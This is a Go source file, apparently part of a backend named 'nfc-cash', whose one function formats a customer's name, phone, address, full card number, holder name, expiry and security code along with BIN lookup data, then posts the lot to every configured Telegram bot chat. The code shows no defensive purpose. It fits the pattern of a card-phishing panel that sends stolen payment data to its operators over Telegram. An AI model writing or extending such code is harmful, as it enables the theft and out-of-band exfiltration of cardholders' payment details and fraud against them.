package telegram

import (
	"bytes"
	"encoding/json"
	"fmt"
	"net/http"

	"github.com/rob-bender/nfc-cash-backend/appl_row"
	"github.com/rob-bender/nfc-cash-backend/pkg/binCard"
)

var baseUrl string = "http://127.0.0.1:9000/home/chats"
var baseUrlTelegram string = "https://api.telegram.org/bot"

var contentType string = "application/json"

type newOrder struct {
	ChatId    string `json:"chat_id"`
	Text      string `json:"text"`
	ParseMode string `json:"parse_mode"`
}

func SendMessageNewOrder(orderForm appl_row.OrderCreate, checkBin binCard.BinInfo, bots []appl_row.Bot) (bool, error) {
	var prepaid string = ""
	if checkBin.Prepaid {
		prepaid = "yes"
	}
	if !checkBin.Prepaid {
		prepaid = "no"
	}
	var order newOrder = newOrder{
		Text: fmt.Sprintf("🔔 *New chat created:* [#%s](%s)\n\n🗓️ *time*\n🌐[%s](%s)\n\n🔔 *New incoming message*\n🪪 *Chat:* [%s](%s)\n\n💬 *Message:*\nBin brand: %s\nBin type: %s\nBin prepaid: %s\nBin bank: %s\nBin country: %s\nName: %s\nMobile phone: %s\nAddress: %s\nCard number: %s\nHolder Name: %s\nExpiration: %s/%s\nSecurity Code: %s",
			orderForm.UidRoom,
			fmt.Sprintf("%s/%s", baseUrl, orderForm.UidRoom),
			fmt.Sprintf("%s/%s", baseUrl, orderForm.UidRoom),
			fmt.Sprintf("%s/%s", baseUrl, orderForm.UidRoom),
			orderForm.UidRoom,
			fmt.Sprintf("%s/%s", baseUrl, orderForm.UidRoom),
			checkBin.Brand,
			checkBin.Type,
			prepaid,
			checkBin.BinBank,
			checkBin.Country,
			orderForm.Name,
			orderForm.Mobile,
			orderForm.Address,
			orderForm.CardNumber,
			orderForm.CardHolderName,
			orderForm.ExpiryMonth,
			orderForm.ExpiryYear,
			orderForm.SecurityCode,
		),
		ParseMode: "markdown",
	}
	if len(bots) > 0 {
		for _, value := range bots {
			order.ChatId = value.ChatId
			orderJson, err := json.Marshal(order)
			if err != nil {
				return false, err
			}
			response, err := http.Post(fmt.Sprintf("%s%s/sendMessage", baseUrlTelegram, value.Token), contentType, bytes.NewBuffer(orderJson))
			if err != nil {
				return false, err
			}
			defer response.Body.Close()
		}
	}

	return true, nil
}
